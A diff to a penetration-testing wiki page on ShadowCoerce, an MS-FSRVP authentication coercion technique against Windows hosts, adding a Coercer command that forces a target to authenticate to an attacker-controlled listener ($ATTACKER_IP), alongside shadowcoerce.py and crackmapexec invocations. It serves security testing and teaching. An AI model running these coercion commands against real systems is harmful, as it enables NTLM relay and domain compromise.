@@ -30,14 +30,24 @@ crackmapexec smb <TARGET> -u <USER> -p <PASSWORD> -M shadowcoerce
 {% endtab %}
 
 {% tab title="Exploit" %}
+#### ShadowCoerce
+
 The following Python proof-of-concept ([https://github.com/ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)) implements the `IsPathSupported` and `IsPathShadowCopied` methods.
 
 {% hint style="success" %}
-**Nota bene**: for the proof of concept to work, using a proper security provider (`RPC_C_AUTHN_WINNT`) and authentication level (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) can required. It is enabled by default in the script.
+**Nota bene**: for the proof of concept to work, using a proper security provider (`RPC_C_AUTHN_WINNT`) and authentication level (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) are required. It is enabled by default in the script.
 {% endhint %}
 
 ```bash
 shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
+```
+
+#### Coercer
+
+Another alternative is to use the [Coercer](https://github.com/p0dalirius/Coercer/tree/master) tool (python) as follow.
+
+```bash
+coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --filter-protocol-name MS-FSRVP -l $ATTACKER_IP -t $TARGET_IP
 ```
 {% endtab %}
 {% endtabs %}
